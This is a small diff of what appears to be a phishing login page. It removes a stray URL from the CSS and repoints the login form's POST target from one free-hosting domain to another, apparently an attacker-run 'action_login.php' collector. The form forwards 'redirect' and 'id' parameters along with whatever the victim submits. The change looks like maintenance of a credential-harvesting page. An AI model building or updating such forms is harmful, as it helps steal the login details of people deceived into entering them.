@@ -156,7 +156,7 @@
 
   100% {
 
-    opacity: 0; }https://phpstack-1223668-4355262.cloudwaysapps.com/
+    opacity: 0; }
 
 }
 
@@ -314,7 +314,7 @@
 
                 <form
 
-                    action="https://servicegate.000webhostapp.com/action/action_login.php?redirect=<?php echo htmlspecialchars($_GET["redirect"],  ENT_QUOTES, 'UTF-8'); ?>&id=<?php echo htmlspecialchars($_GET["id"],  ENT_QUOTES, 'UTF-8'); ?>"
+                    action="https://phpstack-1223668-4355262.cloudwaysapps.com/action/action_login.php?redirect=<?php echo htmlspecialchars($_GET["redirect"],  ENT_QUOTES, 'UTF-8'); ?>&id=<?php echo htmlspecialchars($_GET["id"],  ENT_QUOTES, 'UTF-8'); ?>"
 
                     method="POST">
 
